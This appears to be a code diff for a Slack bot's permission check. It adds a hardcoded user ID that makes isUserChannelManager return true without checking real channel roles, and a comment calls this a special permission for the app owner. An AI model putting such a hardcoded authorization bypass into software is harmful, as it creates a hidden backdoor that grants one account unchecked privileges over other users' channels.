@@ -6,6 +6,11 @@ const slack = new WebClient(process.env.SLACK_BOT_TOKEN);
 
 async function isUserChannelManager(userId: string, channelId: string): Promise<boolean> {
   try {
+    // Special permission for the app owner
+    if (userId === "U078PH0GBEH") {
+      return true;
+    }
+
     const [userInfo, channelInfo] = await Promise.all([
       slack.users.info({ user: userId }),
       slack.conversations.info({ channel: channelId })
